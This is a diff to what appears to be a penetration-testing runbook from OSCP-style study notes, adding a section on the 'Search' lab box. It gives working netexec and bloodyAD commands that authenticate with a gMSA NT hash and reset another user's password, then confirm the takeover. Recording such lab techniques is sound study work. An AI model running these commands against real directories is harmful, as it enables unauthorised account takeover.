@@ -100,6 +100,19 @@ BloodyAD speeds up a specific AD object-abuse operation without hiding the under
 
 - [[RUNBOOK V2/AD - Resource-Based Constrained Delegation]]
 
+## Search: gMSA delegated password reset
+
+Search used a gMSA NT hash for an authenticated directory operation rather than treating the hash as a direct administrator credential:
+
+~~~bash
+netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHash
+bloodyAD -d $Domain -u 'BIR-ADFS-GMSA$' -p :$GmsaHash \
+  --host $BoxIP set password Tristan.Davies $TemporaryPassword
+netexec smb $BoxIP -u Tristan.Davies -p $TemporaryPassword
+~~~
+
+The important evidence is the exact object-right relationship, BloodyAD success output, and the subsequent Pwn3d! validation. Record and restore the target password where possible; Search's manual transcript records the change but not a restoration.
+
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- RBCD from a controlled member computer to the domain controller
